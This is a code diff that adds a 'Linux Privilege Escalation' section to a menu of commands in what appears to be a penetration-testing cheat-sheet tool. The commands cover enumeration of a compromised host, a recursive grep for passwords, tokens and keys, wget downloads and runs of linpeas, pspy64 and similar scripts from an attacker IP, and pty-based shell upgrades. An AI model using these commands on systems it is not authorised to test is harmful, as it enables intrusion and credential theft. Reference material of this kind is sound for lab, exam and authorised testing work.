@@ -1085,7 +1085,159 @@ menu_structure = {
         "Adding backdoor user": [],
      
     },
-    "Linux Privilege Escalation": {},
+    "Linux Privilege Escalation": 
+    {
+        "Manual enumeration": 
+        [
+            {"Basic information":
+                [
+                ("id","Current user"),
+                ("cat /etc/passwd","Available users"),
+                ("ls -lsaht /home","Home directory"),
+                ("hostname","Hostname"),
+                ("which gcc ; which cc ; which python ; which perl ; which wget ; which curl ; which fetch ; which nc ; which ncat ; which nc.traditional ; which socat","Capabiltites"),
+                ("uname -a ; cat /etc/*-release ; cat /etc/issue ;","Compilation"),
+                ("file /bin/bash","System architecture"),
+                ("sudo -l","Are we a real user? "),
+                ("ls -lsaht /etc/sudoers","Sudoers file"),
+                ("export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp","If sudo not available maybe we need to add bins to the path"),
+                ("groups <user>","Are any users member of exotic groups ? "),
+                ("ls -lsaht /var/www/html","Web config credentials"),
+                ("env","Shell's environment variables"),
+                ],
+            },
+            {"List of running processes":
+                [
+                ("ps aux","Running processes"),
+                ("ps aux 2>/dev/null","Running processes"),
+                ("ps aux | grep root","Running processes as root"),
+                ],
+            },
+            {"SUID/GUID/SUDO Escalation":
+                [
+                ("find / -perm -u=s -type f 2>/dev/null","SUID"),
+                ("find / -perm -g=s -type f 2>/dev/null","GUID"),
+                ],
+            },
+            {"Monitoring the system":
+                [
+                ("wget http://192.168.45.185/pspy64","Downloading the binary"),
+                ("chmod +x pspy64","Make it executable"),
+                ("./pspy64","Running"),
+                ],
+            },
+            {"Network":
+                [
+                ("ip a","TCP/IP configuration"),
+                ("routel","Routes"),
+                ("ss -tunlp","Active network connections"),
+                ("netstat -antup","Active network connections"),
+                ("arp -e","Artp table"),
+                ],
+            },
+            {"MySQL":
+                [
+                ("mysql -uroot -p","Connecting to MySQL"),
+                ],
+            },
+            {"Cron":
+                [
+                ("crontab –u root –l","Cron"),
+                ("cat /etc/crontab","Cron"),
+                ("ls /etc/cron.*","Cron"),
+                ("grep \"CRON\" /var/log/syslog","Inspecting the cron log file"),
+                ],
+            },
+            {"Passwords in files":
+                [
+                ("grep -rE --dereference-recursive --color=always \".*(password|passwd|pwd|pass|pswd|secret|key|auth|login|credentials|token|apikey|accesskey).*\" . | less -R","Search for password in files"),
+                ("cat /etc/crontab","Cron"),
+                ("ls /etc/cron.*","Cron"),
+                ],
+            },
+            {"Interesting files":
+                [
+                ("find / -user bob 2>/dev/null","What is every single file bob has ever created ? "),
+                ("cat /etc/crontab","What is files owned by particular group"),
+                ("ls /etc/cron.*","Cron"),
+                ],
+            },
+            {"Interesting paths":
+                [
+                    ("ls -lsaht /var/lib/","Interesting paths"),
+                    ("ls -lsaht /var/db/","Interesting paths"),
+                    ("ls -lsaht /opt/","Interesting paths"),
+                    ("ls -lsaht /tmp/","Interesting paths"),
+                    ("ls -lsaht /var/tmp/","Interesting paths"),
+                    ("ls -lsaht /dev/shm/","Interesting paths"),
+                    ("ls -lsaht /var/mail","Interesting paths"),
+                ],
+            },
+            {"Writable resources":
+                [
+                ("find / \\( -wholename '/home/homedir/*' -prune -o -wholename '/proc/*' -prune \\) -o \\( -type f -perm -0002 \\) -exec ls -l '{}' ';' 2>/dev/null","World writable files"),
+                ("find / \\( -wholename '/home/homedir*' -prune \\) -o \\( -type d -perm -0002 \\) -exec ls -ld '{}' ';' 2>/dev/null | grep -v root","World writable directories"),
+                ("sudo find / -type f -user root -writable 2>/dev/null","Root owned writable files"),
+                ],
+            },
+            {"Unusual mounts":
+                [
+                ("cat /etc/fstab","Unusual mounts"),
+                ],
+            },
+
+        ],
+        "Automated enumeration": 
+        [
+            {"Linpeas":
+                [
+                ("wget http://192.168.45.169/linpeas.sh","Download to target machine"),
+                ("chmod +x linpeas.sh","Execute permission"),
+                ("./linpeas.sh","Running the script"),
+                ],
+            },
+            {"Unix-privesc-check":
+                [
+                ("wget http://192.168.45.180/unix-privesc-check","Download to target machine"),
+                ("chmod +x unix-privesc-check","Execute permission"),
+                ("./unix-privesc-check detailed ","Running the script"),
+                ],
+            },
+            {"Lse":
+                [
+                ("wwget http://192.168.45.169/lse.sh","Download to target machine"),
+                ("chmod +x lse.sh","Execute permission"),
+                ("bash lse.sh -s usr,sud -l 1","Running the script"),
+                ],
+            },
+
+        ],
+        "Upgrading shell": 
+        [
+            {
+                "Upgrading shell - Method #1":
+                [
+                ("python -c 'import pty; pty.spawn(\"/bin/bash\")'","Upgrading shell"),
+                ]
+            },
+            {
+                "Upgrading shell - Method #2":
+                [
+                ("python3 -c 'import pty;pty.spawn(\"/bin/bash\")'","Step 1"),
+                ("CTRL+Z","Step 2"),
+                ("stty raw -echo; fg","Step 3"),
+                ("<Press Enter>","Step 4"),
+                ("export TERM=screen","Step 5"),
+                ]
+            },
+            {
+                "Alias":
+                [
+                ("alias ll='clear ; ls -lsaht --color=auto'","Useful alias"),
+                ]
+            },
+        ],
+    },
     "Web Attacks": {},
     "Exploit & Tricks": {},
     "Password Attacks": {},
